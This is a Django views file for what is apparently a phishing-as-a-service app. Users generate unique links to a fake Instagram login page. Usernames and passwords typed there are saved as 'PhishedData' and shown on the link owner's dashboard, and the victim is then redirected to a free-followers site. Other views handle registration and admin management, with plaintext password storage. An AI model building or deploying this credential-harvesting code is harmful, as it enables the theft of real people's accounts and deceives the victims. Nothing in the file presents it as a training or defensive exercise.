from django.shortcuts import render
from django.shortcuts import redirect
from django.http import HttpResponseRedirect
import uuid
from .models import *


# Create your views here.
def Index(request):
    return render(request,'Index.html')

def Login(request):
    if request.method == 'POST':
        email = request.POST['email']
        password = request.POST['password']
        obj = logindata.objects.get(email=email, password=password)
        usertype = obj.usertype
        print(usertype)
        request.session['usertype'] = usertype
        request.session['email'] = email
        if usertype == 'admin':
            return HttpResponseRedirect('/AdminHome/')
        elif usertype == 'user':
            return HttpResponseRedirect('/UserHome/')
        else:
            return HttpResponseRedirect('/AuthError/')
    else:
        return render(request,'Login.html')


def AdminHome(request):
    if request.session.has_key('usertype'):
        usertype = request.session['usertype']
        if usertype == 'admin':
            return render(request, 'AdminHome.html')
        else:
            return HttpResponseRedirect('/AuthError/')
    else:
        return HttpResponseRedirect('/AuthError/')


def UserHome(request):
    if request.session.has_key('usertype'):
        usertype = request.session['usertype']
        email = request.session['email']
        if usertype == 'user':
            obj = userdata.objects.filter(email=email)
            links = PhishingLink.objects.filter(email=email)
            data = PhishedData.objects.filter(phishing_link__in=links)
            return render(request, 'UserHome.html',{'data':obj,'data1':data})
        else:
            return HttpResponseRedirect('/AuthError/')
    else:
        return HttpResponseRedirect('/AuthError/')


def AuthError(request):
    return render(request, 'AuthError.html')


def logout(request):
    try:
        del request.session['email']
        del request.session['usertype']
    except:
        pass
    return HttpResponseRedirect('/Login/')


def AdminReg(request):
    if request.session.has_key('usertype'):
        usertype = request.session['usertype']
        if usertype == 'admin':
            if request.method == 'POST':
                obj = admindata()
                obj1 = logindata()
                username = request.POST['username']
                address = request.POST['address']
                contact = request.POST['contact']
                e1 = request.POST['email']
                password = request.POST['password']

                obj.name = username
                obj.address = address
                obj.contact = contact
                obj.email = e1
                obj.save()

                obj1.email = e1
                obj1.password = password
                obj1.usertype = 'admin'
                obj1.save()

                return render(request, 'AdminReg.html', {'data': "success"})
            else:
                return render(request, 'AdminReg.html')
       else:
            return HttpResponseRedirect('/AuthError/')
    else:
        return HttpResponseRedirect('/Login/')


def UserReg(request):
    if request.method == 'POST':
        obj = userdata()
        obj1 = logindata()
        username = request.POST['username']
        email = request.POST['email']
        password = request.POST['password']
        obj.name = username
        obj.email = email
        obj.password = password
        obj.save()
        obj1.email = email
        obj1.password = password
        obj1.usertype = 'user'
        obj1.save()
        return render(request, 'UserReg.html', {'data': "success"})
    else:
        return render(request, 'UserReg.html')



def ShowAdmin(request):
    if request.session.has_key('usertype'):
        usertype = request.session['usertype']
        if usertype == 'admin':
            obj = admindata.objects.all()
            return render(request, 'ShowAdmin.html', {'data': obj})
        else:
            return HttpResponseRedirect('/AuthError/')
    else:
        return HttpResponseRedirect('/Login/')


def ShowUser(request):
    if request.session.has_key('usertype'):
        usertype = request.session['usertype']
        if usertype == 'admin':
            obj = userdata.objects.all()
            if obj:
                return render(request, 'ShowUser.html', {'data': obj})
            else:
                return render(request, 'ShowUser.html', {'name': 'User Data Not Found'})
        else:
            return HttpResponseRedirect('/AuthError/')
    else:
        return HttpResponseRedirect('/Login/')


def UserView(request):
    if request.session.has_key('usertype'):
        usertype = request.session['usertype']
        if usertype == 'admin':
            if request.method == 'POST':
                email = request.POST['email']
                obj = userdata.objects.filter(email=email)
                links = PhishingLink.objects.filter(email=email)
                data = PhishedData.objects.filter(phishing_link__in=links)
                return render(request, 'UserDashBoard.html', {'data': obj,'data1':data})
            else:
                return render(request, 'UserDashBoard.html', {'name': 'Data Not Found'})
        else:
            return HttpResponseRedirect('/AuthError/')
    else:
        return HttpResponseRedirect('/Login/')


def UserEdit1(request):
    if request.session.has_key('usertype'):
        usertype = request.session['usertype']
        if usertype == 'admin':
            if request.method == 'POST':
                username = request.POST['username']
                email = request.POST['email']
                password = request.POST['password']
                obj = userdata.objects.get(email=email)
                obj.name = username
                obj.password = password
                obj.save()
                return render(request, 'UserDashBoard.html', {'name': 'Saved'})
            else:
                return render(request, 'UserDashBoard.html', {'name': 'Unsuccessful'})
        else:
            return HttpResponseRedirect('/Autherror/')
    else:
        return HttpResponseRedirect('/Login/')


def UserDelete(request):
    if request.session.has_key('usertype'):
        usertype = request.session['usertype']
        if usertype == 'admin':
            if request.method == 'POST':
                email = request.POST['email']
                obj = userdata.objects.get(email=email)
                obj.delete()
                return render(request, 'ShowUser.html')
            else:
                return render(request, 'ShowUser.html', {'msg': 'Not Delete'})
        else:
            return HttpResponseRedirect('/AuthError/')
    else:
        return HttpResponseRedirect('/Login/')
def generate_link(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        code = str(uuid.uuid4())[:8]
        link = PhishingLink.objects.create(email=email, unique_code=code)
        return render(request, 'show_link.html', {'link': request.build_absolute_uri(f'/Instagram/{code}/')})
    return render(request, 'generate.html')

def Instagram(request, code):
    try:
        phishing_link = PhishingLink.objects.get(unique_code=code)
    except PhishingLink.DoesNotExist:
        return render(request, 'invalid.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        PhishedData.objects.create(phishing_link=phishing_link,entered_username=username,entered_password=password)
        return redirect('https://leofame.com/free-instagram-followers')

    return render(request, 'Instagram.html', {'email': phishing_link.email})
